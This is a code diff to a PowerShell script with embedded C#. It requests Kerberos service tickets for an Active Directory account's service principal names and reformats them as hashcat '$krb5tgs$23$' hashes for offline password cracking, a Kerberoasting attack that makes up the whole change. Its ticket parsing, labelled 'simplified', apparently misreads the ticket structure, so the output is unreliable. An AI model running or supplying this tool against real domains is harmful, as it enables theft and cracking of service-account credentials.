@@ -33,9 +33,6 @@ public class K {
     [DllImport("secur32.dll", SetLastError = true)]
     public static extern int FreeCredentialsHandle(IntPtr phCredential);
 
-    [DllImport("secur32.dll", SetLastError = true)]
-    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
-
     [StructLayout(LayoutKind.Sequential)]
     public struct SecBuffer {
         public uint cbBuffer;
@@ -50,7 +47,7 @@ public class K {
         public IntPtr pBuffers;
     }
 
-    public static string GetTicket(string spn) {
+    public static byte[] GetTicketRaw(string spn) {
         IntPtr cred = IntPtr.Zero;
         IntPtr ctx = IntPtr.Zero;
         IntPtr expiry1 = IntPtr.Zero;
@@ -60,7 +57,7 @@ public class K {
         try {
             SecBuffer secBuf = new SecBuffer();
             secBuf.BufferType = 2; // SECBUFFER_TOKEN
-            secBuf.cbBuffer = 12288; // 0x3000 = 12KB buffer
+            secBuf.cbBuffer = 12288;
             secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
 
             IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
@@ -81,13 +78,13 @@ public class K {
                     IntPtr.Zero,
                     out cred,
                     out expiry1) != 0)
-                return "";
+                return null;
 
             if (InitializeSecurityContext(
                     ref cred,
                     IntPtr.Zero,
                     spn,
-                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
+                    0x00001000,
                     0,
                     16,
                     IntPtr.Zero,
@@ -96,16 +93,15 @@ public class K {
                     ref desc,
                     out attr,
                     out expiry2) != 0)
-                return "";
+                return null;
 
             SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
             if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
-                return "";
+                return null;
 
             byte[] data = new byte[resultBuf.cbBuffer];
             Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
-
-            return BitConverter.ToString(data).Replace("-", "");
+            return data;
         } finally {
             if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
         }
@@ -113,7 +109,7 @@ public class K {
 }
 "@
 
-function Get-KerberosTicketBySamAccountName {
+function Get-KerberosHashcatFormat {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory)]
@@ -123,7 +119,7 @@ function Get-KerberosTicketBySamAccountName {
     try {
         $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
         if (-not $user) {
-            Write-Error "User '$SamAccountName' not found in Active Directory."
+            Write-Error "User '$SamAccountName' not found."
             return
         }
 
@@ -133,19 +129,33 @@ function Get-KerberosTicketBySamAccountName {
         }
 
         foreach ($spn in $user.servicePrincipalName) {
-            try {
-                Write-Host "Requesting ticket for SPN: ${spn}"
-                $ticket = [K]::GetTicket($spn)
-                if ($ticket) {
-                    Write-Output "Kerberos TGS ticket (hex) for ${spn}:`n$ticket"
-                } else {
-                    Write-Warning "Failed to retrieve ticket for ${spn}."
-                }
-            } catch {
-                Write-Warning "Error for ${spn}: $_"
+            Write-Host "Requesting ticket for SPN: $spn"
+
+            $ticketBytes = [K]::GetTicketRaw($spn)
+            if (-not $ticketBytes) {
+                Write-Warning "Failed to retrieve ticket for $spn"
+                continue
+            }
+
+            $ticketHex = [BitConverter]::ToString($ticketBytes) -replace '-'
+
+            # Extract checksum and encdata (simplified)
+            if ($ticketHex -match '.*?(?<checksum>.{32})(?<encdata>.+)$') {
+                $checksum = $matches['checksum']
+                $encdata = $matches['encdata']
+
+                $spnSanitized = $spn -replace ':', '~'
+                $hashcat = "\$krb5tgs\$23\$*$SamAccountName\$$spnSanitized*$checksum`$$encdata"
+
+                Write-Output "`n[+] Hashcat Format:"
+                Write-Output $hashcat
+            }
+            else {
+                Write-Warning "Failed to parse ticket for $spn."
             }
         }
-    } catch {
-        Write-Error "Active Directory query error: $_"
+    }
+    catch {
+        Write-Error "Error: $_"
     }
 }
